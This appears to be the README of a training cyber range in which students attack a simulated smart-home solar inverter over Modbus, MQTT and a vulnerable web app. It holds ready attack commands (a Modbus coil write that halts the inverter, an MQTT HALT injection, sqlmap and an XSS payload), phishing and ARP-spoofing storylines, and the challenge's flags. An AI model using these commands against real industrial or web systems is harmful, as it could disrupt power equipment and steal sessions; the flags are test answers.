# Smart Home PV Compromise - Cyber Range

## ⚡ Realistic Cyber Range Experience

This is a **realistic cyber range** that requires actual penetration testing skills. You must perform real attacks using professional security tools - no copy-paste curl commands.

### What Makes This Realistic?

| Cyber Range Feature | Real-World Parallel |
|---------------------|---------------------|
| ✅ Real `arpspoof` tool required | Actual network MITM attacks |
| ✅ Flags earned through validated attacks | Real-world penetration testing methodology |
| ✅ Proper Modbus protocol with pymodbus | Industrial control system exploitation |
| ✅ Clone websites, host phishing servers | Social engineering campaigns |
| ✅ Steal credentials via realistic phishing | Credential harvesting attacks |
| ⏱️ 3-4 hours of penetration testing | Realistic engagement timeline |

### Key Learning Path

📖 **Start Here**: [CYBER_RANGE_WALKTHROUGH.md](CYBER_RANGE_WALKTHROUGH.md) - Complete attack methodology with professional tools

---

## 🚀 Quick Start

```bash
# Step 1: Start the challenge
cd /home/mastros/gitstuff/stratocyberlab/challenges/smart-home-pv
docker compose up -d

# Step 2: Access the ATTACKER container (has all security tools)
docker compose exec attacker bash

# Step 3: Verify tools are available
which arpspoof tcpdump tshark mosquitto_sub pymodbus
# All should return paths

# Step 4: Begin reconnaissance
nmap -sV 172.20.0.0/24
```

**Primary Targets:**
- `172.20.0.65:80` - PV Controller Web Interface
- `172.20.0.65:15002` - Modbus TCP (ICS Protocol)
- `172.20.0.66:1883` - MQTT Broker
- `172.20.0.72` - Victim Workstation

**📖 Complete Walkthrough**: [CYBER_RANGE_WALKTHROUGH.md](CYBER_RANGE_WALKTHROUGH.md)  
**📖 Design Philosophy**: [CYBER_RANGE_DESIGN.md](CYBER_RANGE_DESIGN.md)  
**📖 Quick Reference**: [QUICK_START.md](QUICK_START.md)  
**📖 Deployment Guide**: [DEPLOYMENT.md](DEPLOYMENT.md)

## 🎯 Challenge Overview

**Difficulty**: Hard  
**Category**: IoT Security, Industrial Control Systems (ICS)  
**Estimated Time**: 3-4 hours  
**Prerequisites**: Networking fundamentals, Linux command line, basic Python  
**Target Network**: 172.20.0.0/24 (playground-net)

### Scenario

You are a security researcher evaluating a smart home PV (photovoltaic/solar panel) system. The homeowner has reported suspicious activity and suspects their PV inverter may be vulnerable to remote attacks. Your task is to perform a comprehensive penetration test using real-world attack techniques.

### Learning Objectives

- Understand IoT and ICS security vulnerabilities
- Exploit industrial protocols (Modbus TCP, MQTT)
- Perform session hijacking and man-in-the-middle attacks
- Leverage web application vulnerabilities (SQL injection, stored XSS)
- Chain multiple attack techniques into realistic scenarios
- Map attacks to MITRE ATT&CK for ICS framework
- Use professional security tools (arpspoof, tcpdump, Wireshark, pymodbus, sqlmap)

## 📊 Attack Storylines

This challenge implements two primary attack storylines with multiple paths:

### SL-1: Direct Protocol Exploitation (Modbus Injection)

**Attack Chain**: Reconnaissance → Modbus Injection → Service Stop

```
┌─────────────┐      ┌──────────────┐      ┌─────────────┐
│   Discover  │─────▶│ Modbus Write │─────▶│  PV HALTED  │
│ WiFi Creds  │      │  Coil 1=True │      │   Impact    │
└─────────────┘      └──────────────┘      └─────────────┘
```

**MITRE ATT&CK**:
- **T1040**: Network Sniffing (WiFi credential discovery)
- **T1046**: Network Service Scanning (Modbus port discovery)
- **T0836**: Modify Parameter (Modbus coil write)
- **T1489**: Service Stop (PV inverter halt)

### SL-2: Multi-Path Attacks

#### SL-2.1: MQTT Session Hijacking

**Attack Chain**: Reconnaissance → ARP Spoof → Session Capture → Command Injection

```
┌───────────┐   ┌───────────┐   ┌────────────┐   ┌──────────┐
│   WiFi    │──▶│    ARP    │──▶│   Sniff    │──▶│  Inject  │
│   Scan    │   │   Spoof   │   │   Token    │   │   HALT   │
└───────────┘   └───────────┘   └────────────┘   └──────────┘
```

**MITRE ATT&CK**:
- **T1557.002**: Man-in-the-Middle via ARP spoofing
- **T1040**: Network Sniffing (MQTT session capture)
- **T0885**: Commonly Used Port (MQTT 1883)
- **T0831**: Manipulation of Control

#### SL-2.2: REST API Session Hijacking

**Attack Chain**: Reconnaissance → Credential Theft (Phishing) → API Authentication → Command Execution

```
┌───────────┐   ┌──────────┐   ┌─────────┐   ┌──────────┐
│   WiFi    │──▶│ Phishing │──▶│   API   │──▶│   HALT   │
│   Scan    │   │  Creds   │   │  Login  │   │ via REST │
└───────────┘   └──────────┘   └─────────┘   └──────────┘
```

**MITRE ATT&CK**:
- **T1566**: Phishing
- **T1110.003**: Password Spraying (weak password)
- **T1078**: Valid Accounts
- **T1190**: Exploit Public-Facing Application

#### SL-2.3: Admin Panel Exploitation

**Attack Chain**: SQL Injection → Admin Access → Stored XSS → Session Theft

```
┌─────────┐   ┌──────────┐   ┌────────────┐   ┌──────────┐
│  SQLi   │──▶│  Admin   │──▶│  Stored    │──▶│  Cookie  │
│  Login  │   │  Access  │   │    XSS     │   │  Theft   │
└─────────┘   └──────────┘   └────────────┘   └──────────┘
```

**MITRE ATT&CK**:
- **T1190**: Exploit Public-Facing Application (SQLi)
- **T1059.007**: JavaScript execution (XSS)
- **T1539**: Steal Web Session Cookie

## 🏁 Getting Started

### Challenge Network Information

**Network**: `playground-net` (172.20.0.0/24)

| Service | IP Address | Ports | Description |
|---------|------------|-------|-------------|
| **pv-controller** | **172.20.0.65** | 80, 15002, 1883 | 🎯 **Main Target** - Web server, Modbus, admin dashboard |
| mosquitto | 172.20.0.66 | 1883 | MQTT broker for IoT telemetry |
| attacker | 172.20.0.70 | - | Your attack platform with tools |
| noise | 172.20.0.71 | - | Background telemetry generator |
| victim | 172.20.0.72 | - | Simulated victim browser (XSS detection) |
| telemetry-seeder | 172.20.0.73 | - | Initial data seeder |
| replayer | 172.20.0.74 | - | PCAP replay service |

### Prerequisites

- Docker and Docker Compose v2
- curl, jq (for testing)
- Web browser (for admin panel testing)

### 1. Start the Challenge

```bash
cd challenges/smart-home-pv
docker compose up -d
```

### 2. Verify Services

```bash
# Check all containers are running
docker compose ps

# Test PV controller (main target)
curl http://172.20.0.65/

# Expected output:
# {
#   "service": "smart-home-pv-controller",
#   "status": "RUNNING",
#   "note": "This is a simulated PV hub for training purposes"
# }
```

### 3. Begin Your Attack

**Start here** - First reconnaissance step:
```bash
# Discover WiFi credentials (Task 1)
curl http://172.20.0.65/wifi_scan

# Or open the admin dashboard in your browser
firefox http://172.20.0.65/admin
```
```

### 3. Access Points

- **Admin Dashboard**: http://172.20.0.65/admin (React SCADA HMI with real-time telemetry)
- **API Documentation**: See "API Endpoints" section below
- **Network Tools**: All tools pre-installed in attacker container

### 4. Begin Your Assessment

Follow the complete cyber range walkthrough:
- **[CYBER_RANGE_WALKTHROUGH.md](CYBER_RANGE_WALKTHROUGH.md)** - Full penetration test methodology with 5 phases

## 🎓 Tasks and Flags

| Task ID | Name | Description | Flag |
|---------|------|-------------|------|
| task1 | Reconnaissance | Find WiFi credentials via `/wifi_scan` | `BSY{PV_RECON_9a7c9f3f9f}` |
| task2 | Modbus Injection | Write to coil 1 on port 15002 to halt inverter | `BSY{PV_INJECTION_135b2aee7c}` |
| task3 | IoT Command | Halt PV via MQTT or REST API | `BSY{PV_HALT_4b7d0b6a8c}` |
| task4 | MQTT Hijack | Intercept session token and send HALT via MQTT | `BSY{PV_MQTT_HIJACK_7c8f1a}` |
| task5 | REST Hijack | Steal credentials via phishing and use REST API | `BSY{PV_REST_HIJACK_22cd3b9d}` |
| task6 | Admin Panel | Exploit SQLi and XSS on admin dashboard | `BSY{PV_DASH_7e3a56}` |

## 🔌 API Endpoints

### Public Endpoints

- `GET /` - Service information and status
- `GET /wifi_scan` - **[RECON FLAG]** Discover WiFi credentials
- `GET /status` - Current PV status and MQTT session token
- `GET /flag` - Main flag (only when PV is halted)
- `GET /flag/modbus`, `/flag/mqtt`, `/flag/rest` - Path-specific flags

### Admin/Dashboard Endpoints

- `GET /admin` - Admin dashboard UI (real-time telemetry chart)
- `GET /admin/mqtt_stream` - Server-Sent Events (SSE) stream of live telemetry
- `GET /admin/mqtt_data` - Last 200 telemetry data points
- `POST /admin/publish_telemetry` - Publish test telemetry to MQTT
- `GET /walkthrough` - Interactive attack walkthrough UI

### Authentication Endpoints

- `POST /api/login` - Login with WiFi password (returns JWT-like token)
  - Body: `{"username":"admin","password":"super-secret-123"}`
  - Returns: `{"token":"<session-token>"}`

- `POST /api/admin/login` - **[VULNERABLE TO SQLi]** Admin login
  - Body: `{"username":"admin","password":"..."}`
  - Vulnerability: String-based SQL injection

### Command Endpoints

- `POST /api/hub/command` - Execute PV commands (requires auth token)
  - Headers: `Authorization: Bearer <token>`
  - Body: `{"command":"HALT"}` or `{"command":"RESTART"}`

- `POST /api/hub/restart` - Restart PV system (bring back online)

### Device Management

- `GET /api/admin/devices` - List devices (no auth)
- `POST /api/admin/devices` - **[VULNERABLE TO XSS]** Create device
  - Body: `{"name":"device-name","description":"..."}`
  - Vulnerability: Stored XSS via unsanitized name field

### Attack Simulation Endpoints

- `POST /do_arp_spoof` - Simulate ARP spoofing (enables session capture)
- `POST /phish` - Simulate phishing credential capture
- `GET /phish_page` - Phishing landing page UI
- `GET /attacker/creds` - Retrieve stolen credentials (requires ARP spoof or phishing)
- `GET /attacker/session` - Retrieve captured MQTT session (requires ARP spoof)

### Utilities

- `GET /logs/<filename>` - Download log files (e.g., `traffic.pcap`, `mqtt_traffic.log`)
- `GET /capture_hash` - Retrieve SHA-256 hash of admin password (for cracking exercises)
- `POST /replayer/start`, `/replayer/stop` - Control PCAP replayer
- `GET /replayer/state` - Get replayer status

## 🛠️ Attacker Container Tools

The `attacker` container includes realistic penetration testing tools:

### Network Tools

```bash
docker compose exec attacker bash

# Scan for open ports
nmap -p- 172.20.0.65

# ARP scan (network discovery)
arp-scan --localnet

# Packet capture
tcpdump -i eth0 -w /opt/pv-controller/logs/attack.pcap
```

### Modbus Tools

```bash
# Python script to write Modbus coil
python3 /home/attacker/tools/attacker_modbus.py 172.20.0.65 15002

# Manual Modbus using pymodbus REPL
pymodbus.console tcp --host 172.20.0.65 --port 15002
```

### MQTT Tools

```bash
# Subscribe to all topics
mosquitto_sub -h 172.20.0.66 -t '#' -v

# Subscribe to specific topic
mosquitto_sub -h 172.20.0.66 -t pv/status

# Publish telemetry
mosquitto_pub -h 172.20.0.66 -t pv/telemetry -m '{"power":1234}'

# Publish control command
mosquitto_pub -h 172.20.0.66 -t pv/control -m '{"command":"HALT","session":"<token>"}'
```

### Web Application Testing

```bash
# SQL injection with sqlmap
sqlmap -u "http://172.20.0.65/api/admin/login" \
  --data "username=admin&password=admin" \
  --batch --dump --tables

# Stored XSS injection
curl -X POST http://172.20.0.65/api/admin/devices \
  -H 'Content-Type: application/json' \
  -d '{"name":"<script>alert(1)</script>","description":"xss-test"}'
```

### Demo Attack Script

```bash
# Run all attacks automatically
bash /home/attacker/tools/demo_attacks.sh
```

## 📦 Industrial Protocols

### Modbus TCP

**Port**: 15002 (custom; standard is 502)  
**Protocol**: Modbus TCP  
**Function**: Control PV inverter via coils

**Coil Map**:
- **Coil 1**: HALT trigger (write `True` to halt PV)

**Security Issues**:
- ❌ No authentication
- ❌ No encryption
- ❌ No integrity checks
- ❌ Trusts any network client

**Example Exploitation**:
```python
from pymodbus.client.sync import ModbusTcpClient
client = ModbusTcpClient('172.20.0.65', port=15002)
client.connect()
client.write_coil(1, True)  # Trigger HALT
client.close()
```

### MQTT

**Port**: 1883 (unencrypted)  
**Broker**: Eclipse Mosquitto 2.0  
**Topics**:
- `pv/status` - Published by controller (includes session token)
- `pv/control` - Accepts HALT commands with session token
- `pv/telemetry` - Real-time power readings

**Security Issues**:
- ❌ Anonymous access allowed
- ❌ No TLS encryption
- ❌ Session tokens in plaintext
- ❌ No topic-level ACLs

**Example Exploitation**:
```bash
# Capture session token
TOKEN=$(mosquitto_sub -h 172.20.0.66 -t pv/status -C 1 | jq -r .session)

# Inject HALT command
mosquitto_pub -h 172.20.0.66 -t pv/control -m "{\"command\":\"HALT\",\"session\":\"$TOKEN\"}"
```

## 🔍 Traffic Analysis

### Download PCAP

```bash
# From browser
open http://172.20.0.65/logs/traffic.pcap

# From command line
curl http://172.20.0.65/logs/traffic.pcap -o traffic.pcap
```

### Analyze in Wireshark

```bash
wireshark traffic.pcap
```

**Filters to use**:
- `mqtt` - MQTT traffic
- `tcp.port == 15002` - Modbus traffic
- `arp` - ARP traffic (spoofing detection)
- `http.request.method == "POST"` - HTTP POST requests

**Look for**:
- MQTT PUBLISH to `pv/status` containing session tokens
- MQTT PUBLISH to `pv/control` with HALT commands
- Modbus function code 0x05 (Write Single Coil)
- SQL injection payloads in HTTP POST data
- XSS payloads in device creation requests

## 🎯 MITRE ATT&CK Mapping

### Full Attack Matrix

| Tactic | Technique | ID | How It's Used |
|--------|-----------|-----|---------------|
| **Reconnaissance** | Network Service Scanning | T1046 | Port scan to find Modbus (15002), MQTT (1883), HTTP (80) |
| | Network Sniffing | T1040 | WiFi scan endpoint reveals credentials |
| | Gather Victim Network Info | T1590 | ARP scan to identify live hosts |
| **Initial Access** | Exploit Public-Facing App | T1190 | Web vulnerabilities (SQLi, XSS) |
| | Valid Accounts | T1078 | Stolen credentials via phishing |
| | Phishing | T1566 | Simulated credential theft |
| **Execution** | Command and Scripting | T1059.006 | Python/Bash scripts for attacks |
| **Credential Access** | Brute Force | T1110 | Dictionary attack on weak passwords |
| | Man-in-the-Middle | T1557.002 | ARP spoofing to capture sessions |
| | Unsecured Credentials | T1552.001 | WiFi password reuse as admin password |
| **Lateral Movement** | Exploit Remote Services | T1210 | From web to Modbus/MQTT |
| **Collection** | Network Sniffing | T1040 | Capture MQTT session tokens |
| | Automated Collection | T0802 (ICS) | Continuous telemetry monitoring |
| **Impact** | Service Stop | T1489 | Halt PV inverter |
| | Denial of Service | T0814 (ICS) | Disruption of power generation |
| | Manipulation of Control | T0831 (ICS) | Direct Modbus/MQTT control |

## 🛡️ Security Recommendations

### Immediate Remediation

1. **Network Segmentation**
   - Isolate IoT devices on separate VLAN
   - Restrict VLAN-to-VLAN traffic
   - Implement firewall rules for Modbus/MQTT

2. **Enable MQTT Security**
   ```conf
   # mosquitto.conf
   listener 8883
   certfile /path/to/cert.pem
   keyfile /path/to/key.pem
   require_certificate true
   allow_anonymous false
   ```

3. **Modbus Security**
   - Deploy Modbus/TCP Security (authentication + encryption)
   - Use VPN tunnels for remote Modbus access
   - Implement application-layer authentication

4. **Web Application Hardening**
   ```python
   # SQL Injection Prevention - Use parameterized queries
   cur.execute("SELECT * FROM users WHERE username = ?", (username,))
   
   # XSS Prevention - Output encoding
   from flask import escape
   safe_name = escape(device_name)
   ```

5. **Authentication Improvements**
   - Implement multi-factor authentication (MFA)
   - Use strong, unique passwords (20+ characters)
   - Rotate credentials every 90 days
   - Implement password complexity requirements

### Long-Term Strategy

- Regular security audits and penetration testing
- Implement intrusion detection system (IDS) for industrial protocols
- Security awareness training for phishing prevention
- Patch management program for IoT firmware
- Zero-trust network architecture
- Certificate-based device authentication

## 🧪 Testing and Automation

### Smoke Test

Run automated tests to verify challenge functionality:

```bash
bash challenges/smart-home-pv/ci/smoke_test.sh
```

This validates:
- All containers start successfully
- HTTP endpoints return expected responses
- MQTT telemetry is published
- SSE streaming works
- Dashboard loads correctly

### Auto-Solve Script

See all flags retrieved automatically:

```bash
bash challenges/smart-home-pv/auto-solve.sh
```

**Note**: Auto-solve demonstrates one possible solution path. Explore other attack vectors for complete learning.

## 📚 Related Class

This challenge is designed for **Class 10: IoT and Smart Grid Security**. See `classes/class10/` for:
- Detailed lesson plan
- Step-by-step exercises
- Background on Modbus and MQTT protocols
- Real-world case studies (Stuxnet, Ukrainian power grid)
- Defense and mitigation strategies

## ⚠️ Security Warnings

### For Training Only

This challenge contains **intentional vulnerabilities** for educational purposes:
- Weak passwords
- SQL injection
- Stored XSS
- Unauthenticated Modbus
- Unencrypted MQTT
- Password reuse

**DO NOT** deploy this code in production environments.

### Legal and Ethical Use

- Only test systems you own or have explicit permission to test
- Unauthorized access to computer systems is illegal (CFAA, Computer Misuse Act, etc.)
- These techniques are for authorized penetration testing and research only

## 🤝 Contributing

Improvements welcome! Areas for contribution:
- Additional attack scenarios
- More realistic protocol implementations
- Enhanced monitoring/logging
- Additional ICS protocols (DNP3, OPC-UA)
- Docker security hardening for production labs

## 📄 License

See [LICENSE](../../LICENSE) file.

## 🔗 References

- **NIST SP 800-82**: Guide to Industrial Control Systems Security
- **IEC 62351**: Power systems security standards
- **OWASP IoT Top 10**: https://owasp.org/www-project-internet-of-things/
- **MITRE ATT&CK for ICS**: https://attack.mitre.org/matrices/ics/
- **Modbus Specification**: https://modbus.org/specs.php
- **MQTT Specification**: https://mqtt.org/mqtt-specification/

## 📞 Support

For questions or issues:
- Check `classes/class10/README.md` for detailed walkthroughs
- Review container logs: `docker compose logs <service-name>`
- Open GitHub issue with challenge tag
